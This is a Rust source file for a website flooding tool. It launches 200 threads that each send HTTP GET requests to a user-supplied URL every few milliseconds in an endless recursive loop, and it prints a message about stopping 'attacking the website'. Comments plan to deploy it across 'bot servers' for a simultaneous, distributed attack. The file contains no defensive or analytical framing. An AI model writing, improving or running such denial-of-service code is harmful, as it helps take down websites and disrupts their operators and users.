extern crate easy_http_request;
extern crate regex;

mod args;
mod io;

use easy_http_request::DefaultHttpRequest;
use regex::Regex;
use std::process;
use std::{thread, time};

// XXX: remotely call bot servers and deploy this script and dependencies
// XXX: remotely call bot servers and execute this program simultaneously

fn main() {
    if io::read_line(get_url()) == "" {
        println!("\nYou stoped attacking the website.\n");
        process::exit(0x0100);         
    }

    let handles = (0..200)
                      .into_iter()
                      .map(|x| {
                          thread::spawn(move || {
                              ping_many_times(x);
                          })
                      })
                      .collect::<Vec<_>>();

    for thread in handles {
        thread.join().unwrap();
    }
}

fn get_url() -> String {
    let (_options, _args) = args::parse();

    if _args.len() < 2 {
        println!("\nURL missing!\n");
        process::exit(0x0100);         
    }

    let url = _args[1].to_string();
    let re  = Regex::new(r"^http[s]{0,1}://").unwrap();

    if !re.is_match(&url) {
        return format!("https://{}", url);
    }

    return url; 
}

fn ping_many_times(x: i32) {
    let response = DefaultHttpRequest::get_from_url_str(get_url())
                       .unwrap()
                       .send  ()
                       .unwrap();

    print!("[{}] ",  x);
    print!("{} ",    response.status_code);
    println!("{:?}", response.headers);
    thread::sleep(time::Duration::from_millis(3));
    ping_many_times(x);
}
